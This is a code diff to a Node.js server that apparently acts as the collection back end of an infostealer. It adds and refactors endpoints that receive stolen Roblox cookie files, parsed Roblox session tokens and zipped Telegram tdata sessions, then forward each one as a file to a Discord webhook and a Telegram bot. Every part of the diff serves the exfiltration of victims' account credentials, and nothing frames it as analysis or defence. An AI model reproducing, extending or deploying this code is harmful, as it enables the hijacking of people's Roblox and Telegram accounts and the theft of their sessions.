@@ -18,6 +18,41 @@ function readBody(req) {
     });
 }
 
+async function sendFileToDiscord(buf, filename, caption) {
+    if (!DISCORD_WEBHOOK) {
+        console.log('Discord: no webhook, skip');
+        return;
+    }
+    const form = new FormData();
+    form.append('payload_json', JSON.stringify({ content: caption }));
+    form.append('files[0]', new Blob([buf]), filename);
+    try {
+        const r = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: form });
+        console.log('Discord sent:', filename, buf.length, 'status:', r.status);
+    } catch (e) {
+        console.log('Discord err:', e.message || e);
+    }
+}
+
+async function sendFileToTG(buf, filename, caption) {
+    if (!TG_TOKEN || !TG_CHAT) {
+        console.log('TG: no token/chat, skip');
+        return;
+    }
+    const form = new FormData();
+    form.append('chat_id', TG_CHAT);
+    form.append('caption', caption);
+    form.append('document', new Blob([buf]), filename);
+    try {
+        const r = await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
+            { method: 'POST', body: form });
+        const t = await r.text();
+        console.log('TG doc resp:', t);
+    } catch (e) {
+        console.log('TG doc err:', e.message || e);
+    }
+}
+
 const server = http.createServer(async (req, res) => {
     if (req.method === 'OPTIONS') {
         res.writeHead(204, {
@@ -28,83 +63,51 @@ const server = http.createServer(async (req, res) => {
         return res.end();
     }
 
-        if (req.method === 'POST' && req.url === '/send') {
+    // ========== raw robloxcookies.dat file ==========
+    if (req.method === 'POST' && req.url === '/send-rbxfile') {
         const buf = await readBody(req);
-        const body = buf.toString('utf8');
-        console.log('=== RBX TOKEN DEBUG ===');
-        console.log('received bytes:', buf.length);
-        console.log('received chars:', body.length);
-        console.log('first 60:', JSON.stringify(body.slice(0, 60)));
-        console.log('last  60:', JSON.stringify(body.slice(-60)));
-        console.log('has newlines:', body.includes('\n'));
-        console.log('has nulls:', body.includes('\0'));
-        console.log('=======================');
+        console.log('=== RBX FILE RECEIVED ===');
+        console.log('bytes:', buf.length);
+        const head = buf.slice(0, 200).toString('utf8').replace(/[^\x20-\x7e]/g, '.');
+        console.log('head:', head);
+        console.log('=========================');
 
-        if (DISCORD_WEBHOOK) {
-            const form = new FormData();
-            form.append('payload_json', JSON.stringify({
-                content: 'RBX token (' + body.length + ' chars)'
-            }));
-            form.append('files[0]', new Blob([body], { type: 'text/plain' }), 'rbx_token.txt');
-            jobs.push(fetch(DISCORD_WEBHOOK, { method: 'POST', body: form })
-                .then(() => console.log('Discord rbx file sent'))
-                .catch(e => console.log('Discord rbx err:', e)));
-        }
+        await Promise.allSettled([
+            sendFileToDiscord(buf, 'robloxcookies.dat', 'RBX raw cookies.dat (' + buf.length + ' bytes)'),
+            sendFileToTG(buf, 'robloxcookies.dat', 'RBX raw cookies.dat (' + buf.length + ' bytes)')
+        ]);
 
-        if (TG_TOKEN && TG_CHAT) {
-            if (body.length > 4000) {
-                const form = new FormData();
-                form.append('chat_id', TG_CHAT);
-                form.append('caption', 'RBX token (' + body.length + ' chars)');
-                form.append('document', new Blob([body], { type: 'text/plain' }), 'rbx_token.txt');
-                jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
-                    { method: 'POST', body: form })
-                    .then(() => console.log('TG rbx doc sent'))
-                    .catch(e => console.log('TG rbx doc err:', e)));
-            } else {
-                jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: 'chat_id=' + encodeURIComponent(TG_CHAT) +
-                          '&text=' + encodeURIComponent('[RBX]\n' + body)
-                }).catch(e => console.log('TG rbx err:', e)));
-            }
-        }
-
-        await Promise.allSettled(jobs);
         res.writeHead(200, { 'Content-Type': 'text/plain' });
         return res.end('ok');
     }
 
-    // TG tdata zip
+    // ========== parsed RBX token text (legacy) ==========
+    if (req.method === 'POST' && req.url === '/send') {
+        const buf = await readBody(req);
+        const body = buf.toString('utf8');
+        console.log('rbx token (parsed) received, len:', body.length);
+
+        await Promise.allSettled([
+            sendFileToDiscord(buf, 'rbx_token_parsed.txt', 'RBX parsed token (' + body.length + ' chars)'),
+            sendFileToTG(buf, 'rbx_token_parsed.txt', 'RBX parsed token (' + body.length + ' chars)')
+        ]);
+
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        return res.end('ok');
+    }
+
+    // ========== tdata zip ==========
     if (req.method === 'POST' && req.url === '/send-tdata') {
         const buf = await readBody(req);
-        console.log('tdata received, size:', buf.length);
-        const jobs = [];
+        console.log('=== TDATA RECEIVED ===');
+        console.log('bytes:', buf.length);
+        console.log('=====================');
 
-        if (TG_TOKEN && TG_CHAT) {
-            const form = new FormData();
-            form.append('chat_id', TG_CHAT);
-            form.append('caption', 'TG tdata session');
-            form.append('document', new Blob([buf], { type: 'application/zip' }), 'tdata.zip');
-            jobs.push(fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendDocument',
-                { method: 'POST', body: form })
-                .then(r => r.text()).then(t => console.log('TG doc:', t))
-                .catch(e => console.log('TG doc err:', e)));
-        }
+        await Promise.allSettled([
+            sendFileToDiscord(buf, 'tdata.zip', 'TG tdata (' + buf.length + ' bytes)'),
+            sendFileToTG(buf, 'tdata.zip', 'TG tdata (' + buf.length + ' bytes)')
+        ]);
 
-        if (DISCORD_WEBHOOK && buf.length < 7 * 1024 * 1024) {
-            const form = new FormData();
-            form.append('payload_json', JSON.stringify({ content: 'TG tdata session' }));
-            form.append('files[0]', new Blob([buf], { type: 'application/zip' }), 'tdata.zip');
-            jobs.push(fetch(DISCORD_WEBHOOK, { method: 'POST', body: form })
-                .then(() => console.log('Discord tdata sent'))
-                .catch(e => console.log('Discord tdata err:', e)));
-        } else if (buf.length >= 7 * 1024 * 1024) {
-            console.log('tdata too big for Discord (' + buf.length + '), TG only');
-        }
-
-        await Promise.allSettled(jobs);
         res.writeHead(200, { 'Content-Type': 'text/plain' });
         return res.end('ok');
     }
